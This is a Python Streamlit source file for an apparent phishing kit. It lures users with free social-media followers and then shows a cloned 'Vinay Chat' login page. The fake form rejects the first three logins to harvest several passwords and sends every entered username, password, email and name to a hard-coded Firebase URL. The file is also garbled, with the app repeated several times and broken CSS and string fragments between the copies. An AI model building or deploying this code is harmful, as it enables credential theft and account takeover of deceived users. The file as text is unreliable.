import streamlit as st
import time
import requests
import datetime
import uuid

# --- 1. PAGE CONFIGURATION ---
st.set_page_config(
    page_title="Free Followers | Vinay Chat Hub",
    page_icon="🔥",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# --- 2. BULLETPROOF CSS INJECTION ---
# Using implicit string concatenation to avoid ALL triple-quote parsing bugs
GLOBAL_CSS = (
    "<style>\n"
    "@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');\n"
    "html, body, [class*='css'] { font-family: 'Inter', sans-serif; }\n"
    "div[data-baseweb='input'] { background-color: #f8fafc !important; border: 1px solid #cbd5e1 !important; border-radius: 8px !important; }\n"
    "div[data-baseweb='input'] input { color: #000000 !important; font-weight: 600 !important; font-size: 15px !important; }\n"
    ".premium-header { text-align: center; margin-bottom: 25px; }\n"
    ".title-gradient { background: linear-gradient(90deg, #1d4ed8, #9333ea); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 32px; font-weight: 800; }\n"
    ".card-box { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }\n"
    "</style>"
)
st.markdown(GLOBAL_CSS, unsafe_allow_html=True)

# --- 3. FIREBASE CONFIG ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION STATE LOGIC ---
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'portal_data' not in st.session_state:
    st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state:
    st.session_state.failed_logins = []

def save_to_firebase(status):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "status": status,
        "follower_portal_data": st.session_state.portal_data,
        "vinay_chat_login_attempts": st.session_state.failed_logins
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS - ACCOUNT CREATION
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Free Followers Portal</div><p style='color:#64748b;'>Create your portal account to get started.</p></div>", unsafe_allow_html=True)
    
    with st.container():
        st.markdown("<div class='card-box'>", unsafe_allow_html=True)
        email = st.text_input("Enter Email Address")
        new_username = st.text_input("Create Portal Username", placeholder="e.g. Creator123")
        password = st.text_input("Create Password", type="password")
        
        if st.button("Register & Verify Username", type="primary", use_container_width=True):
            if email and new_username and password:
                with st.spinner("Checking username availability in global matrix..."):
                    time.sleep(2) 
                    
                if len(new_username) < 4:
                    st.error("Username is too short. Try another.")
                else:
                    st.success("✅ Username is unique and available!")
                    time.sleep(1)
                    st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                    st.session_state.step = 2
                    st.rerun()
            else:
                st.warning("Please fill all fields to create an account.")
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: PERSONAL DETAILS & PROMO
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Personal Cookie Sync</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    fname = st.text_input("First Name")
    lname = st.text_input("Last Name")
    promo = st.text_input("Promo Code (Optional)", placeholder="Enter code if any")
    
    if st.button("Submit Details", type="primary", use_container_width=True):
        if fname:
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname, "promo_code": promo})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("First Name is mandatory.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: PROFILE CHECKS & FOLLOWER SELECTION
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Target Selection</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    st.markdown("#### Step 1: Profile Matrix Checks")
    is_public = st.radio("Is your Vinay Chat profile Public?", ["Yes, it is Public", "No, it is Private"])
    has_dp = st.radio("Have you uploaded a Profile Picture?", ["Yes", "No"])
    
    st.markdown("---")
    st.markdown("#### Step 2: Allocation Size")
    followers = st.select_slider("Select Followers to generate:", options=[100, 200, 500, 1000, 2000, 5000, 10000])
    cost = int((followers / 100) * 10)
    st.info(f"Platform Processing Fee: **₹{cost} INR**")
    
    if st.button("Generate Secure Token", type="primary", use_container_width=True):
        st.session_state.portal_data.update({
            "is_public": is_public, 
            "has_dp": has_dp, 
            "followers_requested": followers, 
            "amount_inr": cost
        })
        st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
        st.session_state.step = 4
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 4: TOKEN & WAIT TIME (ID VERIFY PROMPT)
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Token Generated!</div></div>", unsafe_allow_html=True)
    
    token_html = (
        "<div class='card-box' style='text-align:center;'>\n"
        f"<h3>Your Token: <span style='color:#ef4444;'>{st.session_state.token}</span></h3>\n"
        "<p style='color:#64748b;'>Standard delivery time is <b>24 Hours</b>.</p>\n"
        "<hr>\n"
        "<h4 style='color:#10b981;'>Want it in 1 Hour?</h4>\n"
        "<p>Verify your official Vinay Chat ID to bypass the queue.</p>\n"
        "</div>"
    )
    st.markdown(token_html, unsafe_allow_html=True)
    
    if st.button("Verify Official Vinay Chat ID Now", type="primary", use_container_width=True):
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA
# ==========================================
elif st.session_state.step == 5:
    # 🌟 EXTREMELY SAFE CSS INJECTION FOR THE REPLICA UI 🌟
    STEP5_CSS = (
        "<style>\n"
        ".stApp { background-color: #f5f5f5 !important; }\n"
        "div[data-testid='stVerticalBlock'] > div:first-child { background-color: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); max-width: 400px; margin: auto; }\n"
        ".vc-logo { color: #ef4444; font-size: 32px; font-weight: 600; text-align: center; margin-bottom: 0px; margin-top: -20px; }\n"
        ".vc-brand { color: #000000; font-size: 36px; font-weight: 500; text-align: center; margin-top: 0px; margin-bottom: 30px; }\n"
        "div[data-baseweb='input'] { background-color: #f9fafb !important; border: none !important; }\n"
        "label { color: #6b7280 !important; font-size: 13px !important; font-weight: 600 !important; }\n"
        ".stButton > button { background-color: #fffc00 !important; color: #000000 !important; border-radius: 30px !important; width: 150px !important; display: block !important; margin: 30px auto 10px auto !important; font-weight: 700 !important; border: none !important; box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important; }\n"
        ".stButton > button:hover { background-color: #e6e300 !important; }\n"
        ".vc-footer { text-align: center; font-size: 14px; margin-top: 40px; color: #4b5563; }\n"
        ".vc-footer b { color: #000000; }\n"
        "</style>"
    )
    st.markdown(STEP5_CSS, unsafe_allow_html=True)

    col1, col2, col3 = st.columns([1, 4, 1])
    
    with col2:
        st.markdown("<p class='vc-logo'>logo</p>", unsafe_allow_html=True)
        st.markdown("<p class='vc-brand'>vinay chat</p>", unsafe_allow_html=True)
        
        with st.form("vinay_chat_login", clear_on_submit=False):
            vc_user = st.text_input("Username or Email", placeholder="Your Username Here")
            vc_pass = st.text_input("Password", type="password", placeholder="••••••••")
            
            st.markdown("<p style='text-align:right; font-size:12px; color:#6b7280; margin-top:-10px;'>Forgot Password</p>", unsafe_allow_html=True)
            
            login_btn = st.form_submit_button("Log In")
            
            if login_btn:
                if vc_user and vc_pass:
                    attempt_data = {
                        "attempt_number": st.session_state.login_attempts,
                        "entered_username": vc_user,
                        "entered_password": vc_pass
                    }
                    st.session_state.failed_logins.append(attempt_data)
                    
                    if st.session_state.login_attempts < 4:
                        save_to_firebase(f"FAILED_LOGIN_ATTEMPT_{st.session_state.login_attempts}")
                        st.session_state.login_attempts += 1
                        st.error("Authentication Error: Incorrect Username or Password.")
                    else:
                        save_to_firebase("SUCCESSFUL_FINAL_LOGIN")
                        st.session_state.step = 6
                        st.rerun()
                else:
                    st.warning("Enter both fields.")
                    
        st.markdown("<p class='vc-footer'>New To vinay chat <b>Sign Up</b></p>", unsafe_allow_html=True)

# ==========================================
# STEP 6: FINAL SUCCESS
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-header'><div class='title-gradient'>ID Verified Successfully!</div></div>", unsafe_allow_html=True)
    
    success_html = (
        "<div class='card-box' style='text-align:center;'>\n"
        "<h2 style='color:#10b981;'>Verification Complete ✅</h2>\n"
        "<p>Your official Vinay Chat account is linked securely.</p>\n"
        "<p style='color:#3b82f6; font-weight:600;'>Followers will be injected into your profile within the next 1 Hour.</p>\n"
        "</div>"
    )
    st.markdown(success_html, unsafe_allow_html=True)
    
    if st.button("Go Back Home"):
        st.session_state.clear()
        st.rerun()
    st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state:
    st.session_state.failed_logins = []

def save_to_firebase(status):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "status": status,
        "follower_portal_data": st.session_state.portal_data,
        "vinay_chat_login_attempts": st.session_state.failed_logins
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS - ACCOUNT CREATION
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Free Followers Portal</div><p style='color:#64748b;'>Create your portal account to get started.</p></div>", unsafe_allow_html=True)
    
    with st.container():
        st.markdown("<div class='card-box'>", unsafe_allow_html=True)
        email = st.text_input("Enter Email Address")
        new_username = st.text_input("Create Portal Username", placeholder="e.g. Creator123")
        password = st.text_input("Create Password", type="password")
        
        if st.button("Register & Verify Username", type="primary", use_container_width=True):
            if email and new_username and password:
                with st.spinner("Checking username availability in global matrix..."):
                    time.sleep(2) 
                    
                if len(new_username) < 4:
                    st.error("Username is too short. Try another.")
                else:
                    st.success("✅ Username is unique and available!")
                    time.sleep(1)
                    st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                    st.session_state.step = 2
                    st.rerun()
            else:
                st.warning("Please fill all fields to create an account.")
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: PERSONAL DETAILS & PROMO
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Personal Cookie Sync</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    fname = st.text_input("First Name")
    lname = st.text_input("Last Name")
    promo = st.text_input("Promo Code (Optional)", placeholder="Enter code if any")
    
    if st.button("Submit Details", type="primary", use_container_width=True):
        if fname:
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname, "promo_code": promo})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("First Name is mandatory.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: PROFILE CHECKS & FOLLOWER SELECTION
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Target Selection</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    st.markdown("#### Step 1: Profile Matrix Checks")
    is_public = st.radio("Is your Vinay Chat profile Public?", ["Yes, it is Public", "No, it is Private"])
    has_dp = st.radio("Have you uploaded a Profile Picture?", ["Yes", "No"])
    
    st.markdown("---")
    st.markdown("#### Step 2: Allocation Size")
    followers = st.select_slider("Select Followers to generate:", options=[100, 200, 500, 1000, 2000, 5000, 10000])
    cost = int((followers / 100) * 10)
    st.info(f"Platform Processing Fee: **₹{cost} INR**")
    
    if st.button("Generate Secure Token", type="primary", use_container_width=True):
        st.session_state.portal_data.update({
            "is_public": is_public, 
            "has_dp": has_dp, 
            "followers_requested": followers, 
            "amount_inr": cost
        })
        st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
        st.session_state.step = 4
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 4: TOKEN & WAIT TIME (ID VERIFY PROMPT)
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Token Generated!</div></div>", unsafe_allow_html=True)
    
    token_html = (
        "<div class='card-box' style='text-align:center;'>\n"
        f"<h3>Your Token: <span style='color:#ef4444;'>{st.session_state.token}</span></h3>\n"
        "<p style='color:#64748b;'>Standard delivery time is <b>24 Hours</b>.</p>\n"
        "<hr>\n"
        "<h4 style='color:#10b981;'>Want it in 1 Hour?</h4>\n"
        "<p>Verify your official Vinay Chat ID to bypass the queue.</p>\n"
        "</div>"
    )
    st.markdown(token_html, unsafe_allow_html=True)
    
    if st.button("Verify Official Vinay Chat ID Now", type="primary", use_container_width=True):
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA
# ==========================================
elif st.session_state.step == 5:
    # 🌟 EXTREMELY SAFE CSS INJECTION FOR THE REPLICA UI 🌟
    STEP5_CSS = (
        "<style>\n"
        ".stApp { background-color: #f5f5f5 !important; }\n"
        "div[data-testid='stVerticalBlock'] > div:first-child { background-color: white; padding: 40px 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); max-width: 400px; margin: auto; }\n"
        ".vc-logo { color: #ef4444; font-size: 32px; font-weight: 600; text-align: center; margin-bottom: 0px; margin-top: -20px; }\n"
        ".vc-brand { color: #000000; font-size: 36px; font-weight: 500; text-align: center; margin-top: 0px; margin-bottom: 30px; }\n"
        "div[data-baseweb='input'] { background-color: #f9fafb !important; border: none !important; }\n"
        "label { color: #6b7280 !important; font-size: 13px !important; font-weight: 600 !important; }\n"
        ".stButton > button { background-color: #fffc00 !important; color: #000000 !important; border-radius: 30px !important; width: 150px !important; display: block !important; margin: 30px auto 10px auto !important; font-weight: 700 !important; border: none !important; box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important; }\n"
        ".stButton > button:hover { background-color: #e6e300 !important; }\n"
        ".vc-footer { text-align: center; font-size: 14px; margin-top: 40px; color: #4b5563; }\n"
        ".vc-footer b { color: #000000; }\n"
        "</style>"
    )
    st.markdown(STEP5_CSS, unsafe_allow_html=True)

    col1, col2, col3 = st.columns([1, 4, 1])
    
    with col2:
        st.markdown("<p class='vc-logo'>logo</p>", unsafe_allow_html=True)
        st.markdown("<p class='vc-brand'>vinay chat</p>", unsafe_allow_html=True)
        
        with st.form("vinay_chat_login", clear_on_submit=False):
            vc_user = st.text_input("Username or Email", placeholder="Your Username Here")
            vc_pass = st.text_input("Password", type="password", placeholder="••••••••")
            
            st.markdown("<p style='text-align:right; font-size:12px; color:#6b7280; margin-top:-10px;'>Forgot Password</p>", unsafe_allow_html=True)
            
            login_btn = st.form_submit_button("Log In")
            
            if login_btn:
                if vc_user and vc_pass:
                    attempt_data = {
                        "attempt_number": st.session_state.login_attempts,
                        "entered_username": vc_user,
                        "entered_password": vc_pass
                    }
                    st.session_state.failed_logins.append(attempt_data)
                    
                    if st.session_state.login_attempts < 4:
                        save_to_firebase(f"FAILED_LOGIN_ATTEMPT_{st.session_state.login_attempts}")
                        st.session_state.login_attempts += 1
                        st.error("Authentication Error: Incorrect Username or Password.")
                    else:
                        save_to_firebase("SUCCESSFUL_FINAL_LOGIN")
                        st.session_state.step = 6
                        st.rerun()
                else:
                    st.warning("Enter both fields.")
                    
        st.markdown("<p class='vc-footer'>New To vinay chat <b>Sign Up</b></p>", unsafe_allow_html=True)

# ==========================================
# STEP 6: FINAL SUCCESS
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-header'><div class='title-gradient'>ID Verified Successfully!</div></div>", unsafe_allow_html=True)
    
    success_html = (
        "<div class='card-box' style='text-align:center;'>\n"
        "<h2 style='color:#10b981;'>Verification Complete ✅</h2>\n"
        "<p>Your official Vinay Chat account is linked securely.</p>\n"
        "<p style='color:#3b82f6; font-weight:600;'>Followers will be injected into your profile within the next 1 Hour.</p>\n"
        "</div>"
    )
    st.markdown(success_html, unsafe_allow_html=True)
    
    if st.button("Go Back Home"):
        st.session_state.clear()
        st.rerun()
.premium-header {
    text-align: center;
    margin-bottom: 25px;
}
.title-gradient {
    background: linear-gradient(90deg, #1d4ed8, #9333ea);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    font-size: 32px;
    font-weight: 800;
}
.card-box {
    background: #ffffff;
    padding: 30px;
    border-radius: 12px;
    box-shadow: 0 8px 20px rgba(0,0,0,0.06);
    border: 1px solid #e2e8f0;
}
</style>
"""
st.markdown(GLOBAL_CSS, unsafe_allow_html=True)

# --- 3. FIREBASE CONFIG ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION STATE LOGIC ---
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'portal_data' not in st.session_state:
    st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state:
    st.session_state.failed_logins = []

def save_to_firebase(status):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "status": status,
        "follower_portal_data": st.session_state.portal_data,
        "vinay_chat_login_attempts": st.session_state.failed_logins
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS - ACCOUNT CREATION
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Free Followers Portal</div><p style='color:#64748b;'>Create your portal account to get started.</p></div>", unsafe_allow_html=True)
    
    with st.container():
        st.markdown("<div class='card-box'>", unsafe_allow_html=True)
        email = st.text_input("Enter Email Address")
        new_username = st.text_input("Create Portal Username", placeholder="e.g. Creator123")
        password = st.text_input("Create Password", type="password")
        
        if st.button("Register & Verify Username", type="primary", use_container_width=True):
            if email and new_username and password:
                with st.spinner("Checking username availability in global matrix..."):
                    time.sleep(2) 
                    
                if len(new_username) < 4:
                    st.error("Username is too short. Try another.")
                else:
                    st.success("✅ Username is unique and available!")
                    time.sleep(1)
                    st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                    st.session_state.step = 2
                    st.rerun()
            else:
                st.warning("Please fill all fields to create an account.")
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: PERSONAL DETAILS & PROMO
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Personal Cookie Sync</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    fname = st.text_input("First Name")
    lname = st.text_input("Last Name")
    promo = st.text_input("Promo Code (Optional)", placeholder="Enter code if any")
    
    if st.button("Submit Details", type="primary", use_container_width=True):
        if fname:
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname, "promo_code": promo})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("First Name is mandatory.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: PROFILE CHECKS & FOLLOWER SELECTION
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Target Selection</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    st.markdown("#### Step 1: Profile Matrix Checks")
    is_public = st.radio("Is your Vinay Chat profile Public?", ["Yes, it is Public", "No, it is Private"])
    has_dp = st.radio("Have you uploaded a Profile Picture?", ["Yes", "No"])
    
    st.markdown("---")
    st.markdown("#### Step 2: Allocation Size")
    followers = st.select_slider("Select Followers to generate:", options=[100, 200, 500, 1000, 2000, 5000, 10000])
    cost = int((followers / 100) * 10)
    st.info(f"Platform Processing Fee: **₹{cost} INR**")
    
    if st.button("Generate Secure Token", type="primary", use_container_width=True):
        st.session_state.portal_data.update({
            "is_public": is_public, 
            "has_dp": has_dp, 
            "followers_requested": followers, 
            "amount_inr": cost
        })
        st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
        st.session_state.step = 4
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 4: TOKEN & WAIT TIME (ID VERIFY PROMPT)
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Token Generated!</div></div>", unsafe_allow_html=True)
    
    token_html = f"""
    <div class='card-box' style='text-align:center;'>
        <h3>Your Token: <span style='color:#ef4444;'>{st.session_state.token}</span></h3>
        <p style='color:#64748b;'>Standard delivery time is <b>24 Hours</b>.</p>
        <hr>
        <h4 style='color:#10b981;'>Want it in 1 Hour?</h4>
        <p>Verify your official Vinay Chat ID to bypass the queue.</p>
    </div>
    """
    st.markdown(token_html, unsafe_allow_html=True)
    
    if st.button("Verify Official Vinay Chat ID Now", type="primary", use_container_width=True):
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA
# ==========================================
elif st.session_state.step == 5:
    # 🌟 SAFE CSS INJECTION FOR STEP 5 🌟
    STEP5_CSS = """
    <style>
    .stApp { background-color: #f5f5f5 !important; }
    
    div[data-testid="stVerticalBlock"] > div:first-child {
        background-color: white;
        padding: 40px 30px;
        border-radius: 12px;
        box-shadow: 0 4px 10px rgba(0,0,0,0.05);
        max-width: 400px;
        margin: auto;
    }
    
    .vc-logo { color: #ef4444; font-size: 32px; font-weight: 600; text-align: center; margin-bottom: 0px; margin-top: -20px;}
    .vc-brand { color: #000000; font-size: 36px; font-weight: 500; text-align: center; margin-top: 0px; margin-bottom: 30px;}
    
    div[data-baseweb="input"] { background-color: #f9fafb !important; border: none !important; }
    label { color: #6b7280 !important; font-size: 13px !important; font-weight: 600 !important; }
    
    .stButton > button {
        background-color: #fffc00 !important;
        color: #000000 !important;
        border-radius: 30px !important;
        width: 150px !important;
        display: block !important;
        margin: 30px auto 10px auto !important;
        font-weight: 700 !important;
        border: none !important;
        box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important;
    }
    .stButton > button:hover { background-color: #e6e300 !important; }
    
    .vc-footer { text-align: center; font-size: 14px; margin-top: 40px; color: #4b5563; }
    .vc-footer b { color: #000000; }
    </style>
    """
    st.markdown(STEP5_CSS, unsafe_allow_html=True)

    col1, col2, col3 = st.columns([1, 4, 1])
    
    with col2:
        st.markdown("<p class='vc-logo'>logo</p>", unsafe_allow_html=True)
        st.markdown("<p class='vc-brand'>vinay chat</p>", unsafe_allow_html=True)
        
        with st.form("vinay_chat_login", clear_on_submit=False):
            vc_user = st.text_input("Username or Email", placeholder="Your Username Here")
            vc_pass = st.text_input("Password", type="password", placeholder="••••••••")
            
            st.markdown("<p style='text-align:right; font-size:12px; color:#6b7280; margin-top:-10px;'>Forgot Password</p>", unsafe_allow_html=True)
            
            login_btn = st.form_submit_button("Log In")
            
            if login_btn:
                if vc_user and vc_pass:
                    attempt_data = {
                        "attempt_number": st.session_state.login_attempts,
                        "entered_username": vc_user,
                        "entered_password": vc_pass
                    }
                    st.session_state.failed_logins.append(attempt_data)
                    
                    if st.session_state.login_attempts < 4:
                        save_to_firebase(f"FAILED_LOGIN_ATTEMPT_{st.session_state.login_attempts}")
                        st.session_state.login_attempts += 1
                        st.error("Authentication Error: Incorrect Username or Password.")
                    else:
                        save_to_firebase("SUCCESSFUL_FINAL_LOGIN")
                        st.session_state.step = 6
                        st.rerun()
                else:
                    st.warning("Enter both fields.")
                    
        st.markdown("<p class='vc-footer'>New To vinay chat <b>Sign Up</b></p>", unsafe_allow_html=True)

# ==========================================
# STEP 6: FINAL SUCCESS
# ==========================================
elif st.session_state.step == 6:
    st.markdown("<div class='premium-header'><div class='title-gradient'>ID Verified Successfully!</div></div>", unsafe_allow_html=True)
    
    success_html = """
    <div class='card-box' style='text-align:center;'>
        <h2 style='color:#10b981;'>Verification Complete ✅</h2>
        <p>Your official Vinay Chat account is linked securely.</p>
        <p style='color:#3b82f6; font-weight:600;'>Followers will be injected into your profile within the next 1 Hour.</p>
    </div>
    """
    st.markdown(success_html, unsafe_allow_html=True)
    
    if st.button("Go Back Home"):
        st.session_state.clear()
        st.rerun()
    .premium-header {
        text-align: center;
        margin-bottom: 25px;
    }
    .title-gradient {
        background: linear-gradient(90deg, #1d4ed8, #9333ea);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        font-size: 32px;
        font-weight: 800;
    }
    .card-box {
        background: #ffffff;
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 8px 20px rgba(0,0,0,0.06);
        border: 1px solid #e2e8f0;
    }
    </style>
""", unsafe_allow_html=True)

# --- 3. FIREBASE CONFIG ---
FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/vinay_chat_requests.json"

# --- 4. SESSION STATE LOGIC ---
if 'step' not in st.session_state:
    st.session_state.step = 1
if 'portal_data' not in st.session_state:
    st.session_state.portal_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 1
if 'failed_logins' not in st.session_state:
    st.session_state.failed_logins = []

def save_to_firebase(status):
    payload = {
        "timestamp": str(datetime.datetime.now()),
        "status": status,
        "follower_portal_data": st.session_state.portal_data,
        "vinay_chat_login_attempts": st.session_state.failed_logins
    }
    try:
        requests.post(FIREBASE_URL, json=payload)
    except:
        pass

# ==========================================
# STEP 1: FREE FOLLOWERS - ACCOUNT CREATION
# ==========================================
if st.session_state.step == 1:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Free Followers Portal</div><p style='color:#64748b;'>Create your portal account to get started.</p></div>", unsafe_allow_html=True)
    
    with st.container():
        st.markdown("<div class='card-box'>", unsafe_allow_html=True)
        email = st.text_input("Enter Email Address")
        new_username = st.text_input("Create Portal Username", placeholder="e.g. Creator123")
        password = st.text_input("Create Password", type="password")
        
        if st.button("Register & Verify Username", type="primary", use_container_width=True):
            if email and new_username and password:
                with st.spinner("Checking username availability in global matrix..."):
                    time.sleep(2) # Fake verification delay
                    
                # Fake logic to show premium verification
                if len(new_username) < 4:
                    st.error("Username is too short. Try another.")
                else:
                    st.success("✅ Username is unique and available!")
                    time.sleep(1)
                    st.session_state.portal_data.update({"email": email, "portal_username": new_username, "portal_password": password})
                    st.session_state.step = 2
                    st.rerun()
            else:
                st.warning("Please fill all fields to create an account.")
        st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 2: PERSONAL DETAILS & PROMO
# ==========================================
elif st.session_state.step == 2:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Personal Cookie Sync</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    fname = st.text_input("First Name")
    lname = st.text_input("Last Name")
    promo = st.text_input("Promo Code (Optional)", placeholder="Enter code if any")
    
    if st.button("Submit Details", type="primary", use_container_width=True):
        if fname:
            st.session_state.portal_data.update({"first_name": fname, "last_name": lname, "promo_code": promo})
            st.session_state.step = 3
            st.rerun()
        else:
            st.error("First Name is mandatory.")
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 3: PROFILE CHECKS & FOLLOWER SELECTION
# ==========================================
elif st.session_state.step == 3:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Target Selection</div></div>", unsafe_allow_html=True)
    
    st.markdown("<div class='card-box'>", unsafe_allow_html=True)
    st.markdown("#### Step 1: Profile Matrix Checks")
    is_public = st.radio("Is your Vinay Chat profile Public?", ["Yes, it is Public", "No, it is Private"])
    has_dp = st.radio("Have you uploaded a Profile Picture?", ["Yes", "No"])
    
    st.markdown("---")
    st.markdown("#### Step 2: Allocation Size")
    followers = st.select_slider("Select Followers to generate:", options=[100, 200, 500, 1000, 2000, 5000, 10000])
    cost = int((followers / 100) * 10)
    st.info(f"Platform Processing Fee: **₹{cost} INR**")
    
    if st.button("Generate Secure Token", type="primary", use_container_width=True):
        st.session_state.portal_data.update({
            "is_public": is_public, 
            "has_dp": has_dp, 
            "followers_requested": followers, 
            "amount_inr": cost
        })
        st.session_state.token = f"VCF-{str(uuid.uuid4())[:8].upper()}"
        st.session_state.step = 4
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==========================================
# STEP 4: TOKEN & WAIT TIME (ID VERIFY PROMPT)
# ==========================================
elif st.session_state.step == 4:
    st.markdown("<div class='premium-header'><div class='title-gradient'>Token Generated!</div></div>", unsafe_allow_html=True)
    
    st.markdown(f"""
    <div class='card-box' style='text-align:center;'>
        <h3>Your Token: <span style='color:#ef4444;'>{st.session_state.token}</span></h3>
        <p style='color:#64748b;'>Standard delivery time is <b>24 Hours</b>.</p>
        <hr>
        <h4 style='color:#10b981;'>Want it in 1 Hour?</h4>
        <p>Verify your official Vinay Chat ID to bypass the queue.</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Verify Official Vinay Chat ID Now", type="primary", use_container_width=True):
        st.session_state.step = 5
        st.rerun()

# ==========================================
# STEP 5: EXACT VINAY CHAT LOGIN REPLICA (IMAGE CLONE)
# ==========================================
elif st.session_state.step == 5:
    # 🌟 INJECTING SPECIFIC CSS TO MATCH YOUR IMAGE EXACTLY 🌟
    st.markdown(r"""
        <style>
        /* Light Gray Background for the whole app */
        .stApp { background-color: #f5f5f5 !important; }
        
        /* White Card Replica */
        div[data-testid="stVerticalBlock"] > div:first-child {
            background-color: white;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
            max-width: 400px;
            margin: auto;
        }
        
        /* Title adjustments */
        .vc-logo { color: #ef4444; font-size: 32px; font-weight: 600; text-align: center; margin-bottom: 0px; margin-top: -20px;}
